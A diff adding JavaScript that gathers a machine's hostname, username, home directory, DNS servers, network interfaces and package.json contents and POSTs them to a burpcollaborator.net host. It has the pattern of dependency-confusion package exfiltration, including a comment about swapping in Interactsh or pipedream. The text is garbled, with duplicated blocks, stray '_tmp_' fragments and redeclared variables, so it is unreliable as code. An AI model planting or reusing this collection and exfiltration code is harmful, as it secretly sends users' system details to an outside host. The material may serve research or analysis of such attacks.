@@ -1,0 +1,75 @@
+var hostname = os.hostname()
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    payload: hostname,
+    project_id: process.argv[2]
+  })
+)
+JSON.stringify({
+    payload: hostname,
+    project_id: process.argv[2]
+  })
+const package = packageJSON.name
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    ip: os.networkInterfaces(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+})
+const options = {
+  hostname: process.argv[2] + '.' + hostname + '.u3yd2b3m6fp5a9cgam2a29fdd4jv7k.burpcollaborator.net',
+  port: 443,
+  path: '/',
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  },
+  rejectUnauthorized: false
+}
+_tmp_3.hostname = process.argv[2] + '.' + hostname + '.u3yd2b3m6fp5a9cgam2a29fdd4jv7k.burpcollaborator.net'
+_tmp_3.headers = {
+    'Content-Type': 'application/json',
+    'Content-Length': data.length
+  }
+_tmp_4.Content-Length = data.length
+var postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
+const req = https.request(options, res => {})
+req.write(data)
+var options = {
+    hostname: "u3yd2b3m6fp5a9cgam2a29fdd4jv7k.burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+}
+_tmp_2.headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    }
+_tmp_3.Content-Length = postData.length
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+})
+res.on("data", (d) => {
+        process.stdout.write(d);
+    })
+(_tmp_4 = process.stdout).write
+req.on("error", (e) => {
+    // console.error(e);
+})
+req.write(postData)
